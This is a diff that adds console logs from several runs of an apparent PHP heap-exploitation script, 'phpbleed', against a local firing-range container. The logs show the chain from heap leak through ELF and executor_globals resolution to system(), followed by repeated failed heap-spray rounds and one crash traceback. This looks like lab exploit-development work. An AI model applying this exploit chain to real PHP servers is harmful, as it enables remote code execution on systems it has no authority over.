@@ -292,3 +292,413 @@
   docker logs --tail 50 php-firing-range-bleed82-1
 
 [*] Total requests: 70 (crashes: 38)
+============================================================
+============================================================
+  phpbleed: heap -> ELF -> EG -> system() -> canary over HTTP
+  Target: http://127.0.0.1:8089/index.php
+============================================================
+18:32:11Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+  heap_ref = 0xed3f88a571a0
+  libphp           = 0xed3f8aaa0000
+  executor_globals = 0xed3f8b9c2e40 (offset 0xf22e40)
+  PLTGOT           = 0xed3f8b99ffe8
+  system() = 0xed3f8c0092c0
+  get_properties_for = handlers+0xc0
+18:32:11Z [R-6/R-7 round 1] opening fresh worker pin
+
+[Phase R-6] round 1: pinning one worker (keep-alive)
+18:32:11Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+Traceback (most recent call last):
+  File "/home/user/php-firing-range/lanes/phpbleed-glm/phpbleed_8089.py", line 2008, in <module>
+    main()
+    ~~~~^^
+  File "/home/user/php-firing-range/lanes/phpbleed-glm/phpbleed_8089.py", line 1943, in main
+    spray_addr = find_spray_slot(heap_ref, pinned=True)
+  File "/home/user/php-firing-range/lanes/phpbleed-glm/phpbleed_8089.py", line 1378, in find_spray_slot
+    r2 = isstring_read(addr, pinned=pinned)
+  File "/home/user/php-firing-range/lanes/phpbleed-glm/phpbleed_8089.py", line 504, in isstring_read
+    output = pin_send(b'cook=' + urlencode_bytes(payload),
+                      'application/x-www-form-urlencoded', timeout=timeout)
+  File "/home/user/php-firing-range/lanes/phpbleed-glm/phpbleed_8089.py", line 332, in pin_send
+    return fail('PIN-CRASH/conn-closed')
+  File "/home/user/php-firing-range/lanes/phpbleed-glm/phpbleed_8089.py", line 321, in fail
+    crash_count += 1
+    ^^^^^^^^^^^
+UnboundLocalError: cannot access local variable 'crash_count' where it is not associated with a value
+============================================================
+============================================================
+  phpbleed: heap -> ELF -> EG -> system() -> canary over HTTP
+  Target: http://127.0.0.1:8089/index.php
+============================================================
+18:34:32Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+  heap_ref = 0xed3f88a571a0
+  libphp           = 0xed3f8aaa0000
+  executor_globals = 0xed3f8b9c2e40 (offset 0xf22e40)
+  PLTGOT           = 0xed3f8b99ffe8
+  system() = 0xed3f8c0092c0
+  get_properties_for = handlers+0xc0
+18:34:32Z [R-6/R-7 round 1] opening fresh worker pin
+
+[Phase R-6] round 1: pinning one worker (keep-alive)
+18:34:32Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:32Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:32Z [R-6 round 1] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:34:32Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:32Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:32Z [R-6] FAILED round 1 (spray slot not found)
+18:34:32Z [R-6/R-7 round 2] opening fresh worker pin
+
+[Phase R-6] round 2: pinning one worker (keep-alive)
+18:34:32Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:33Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:33Z [R-6 round 2] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:34:33Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:33Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:33Z [R-6] FAILED round 2 (spray slot not found)
+18:34:33Z [R-6/R-7 round 3] opening fresh worker pin
+
+[Phase R-6] round 3: pinning one worker (keep-alive)
+18:34:33Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:34Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:34Z [R-6 round 3] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:34:34Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:34Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:34Z [R-6] FAILED round 3 (spray slot not found)
+18:34:34Z [R-6/R-7 round 4] opening fresh worker pin
+
+[Phase R-6] round 4: pinning one worker (keep-alive)
+18:34:34Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:35Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:35Z [R-6 round 4] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:34:35Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:35Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:35Z [R-6] FAILED round 4 (spray slot not found)
+18:34:35Z [R-6/R-7 round 5] opening fresh worker pin
+
+[Phase R-6] round 5: pinning one worker (keep-alive)
+18:34:35Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:36Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:36Z [R-6 round 5] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a581a0
+18:34:36Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:37Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:37Z [R-6] FAILED round 5 (spray slot not found)
+18:34:37Z [R-6/R-7 round 6] opening fresh worker pin
+
+[Phase R-6] round 6: pinning one worker (keep-alive)
+18:34:37Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:37Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:37Z [R-6 round 6] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a581a0
+18:34:37Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:38Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:38Z [R-6] FAILED round 6 (spray slot not found)
+18:34:38Z [R-6/R-7 round 7] opening fresh worker pin
+
+[Phase R-6] round 7: pinning one worker (keep-alive)
+18:34:38Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:38Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:38Z [R-6 round 7] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a581a0
+18:34:38Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:38Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:38Z [R-6] FAILED round 7 (spray slot not found)
+18:34:38Z [R-6/R-7 round 8] opening fresh worker pin
+
+[Phase R-6] round 8: pinning one worker (keep-alive)
+18:34:38Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:39Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:39Z [R-6 round 8] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a581a0
+18:34:39Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  Bin-320 SRUN at page 100, free_count=0
+  Run start = 0xed3f88a64000
+18:34:39Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:39Z [R-6] FAILED round 8 (spray slot not found)
+18:34:39Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
+
+  No flag in HTTP stream yet; check 'their channel':
+  docker logs --tail 50 php-firing-range-bleed82-1
+
+[*] Total requests: 649 (crashes: 32)
+============================================================
+============================================================
+  phpbleed: heap -> ELF -> EG -> system() -> canary over HTTP
+  Target: http://127.0.0.1:8089/index.php
+============================================================
+18:35:46Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+  heap_ref = 0xed3f88a581a0
+  libphp           = 0xed3f8aaa0000
+  executor_globals = 0xed3f8b9c2e40 (offset 0xf22e40)
+  PLTGOT           = 0xed3f8b99ffe8
+  system() = 0xed3f8c0092c0
+  get_properties_for = handlers+0xc0
+18:35:46Z [R-6/R-7 round 1] opening fresh worker pin
+
+[Phase R-6] round 1: pinning one worker (keep-alive)
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6 round 1] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6] FAILED round 1 (spray slot not found)
+18:35:46Z [R-6/R-7 round 2] opening fresh worker pin
+
+[Phase R-6] round 2: pinning one worker (keep-alive)
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6 round 2] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a581a0
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6] FAILED round 2 (spray slot not found)
+18:35:46Z [R-6/R-7 round 3] opening fresh worker pin
+
+[Phase R-6] round 3: pinning one worker (keep-alive)
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6 round 3] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6] FAILED round 3 (spray slot not found)
+18:35:46Z [R-6/R-7 round 4] opening fresh worker pin
+
+[Phase R-6] round 4: pinning one worker (keep-alive)
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6 round 4] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6] FAILED round 4 (spray slot not found)
+18:35:46Z [R-6/R-7 round 5] opening fresh worker pin
+
+[Phase R-6] round 5: pinning one worker (keep-alive)
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6 round 5] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6] FAILED round 5 (spray slot not found)
+18:35:46Z [R-6/R-7 round 6] opening fresh worker pin
+
+[Phase R-6] round 6: pinning one worker (keep-alive)
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6 round 6] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6] FAILED round 6 (spray slot not found)
+18:35:46Z [R-6/R-7 round 7] opening fresh worker pin
+
+[Phase R-6] round 7: pinning one worker (keep-alive)
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6 round 7] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6] FAILED round 7 (spray slot not found)
+18:35:46Z [R-6/R-7 round 8] opening fresh worker pin
+
+[Phase R-6] round 8: pinning one worker (keep-alive)
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6 round 8] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:35:46Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+  bin-320 SRUN pages: [('page 100', 'free 0')]
+  Probe base page = 100 -> 0xed3f88a64000
+  Probing page 100 @ 0xed3f88a64000
+18:35:46Z [R-6] FAILED round 8 (spray slot not found)
+18:35:46Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
+
+  No flag in HTTP stream yet; check 'their channel':
+  docker logs --tail 50 php-firing-range-bleed82-1
+
+[*] Total requests: 217 (crashes: 0)
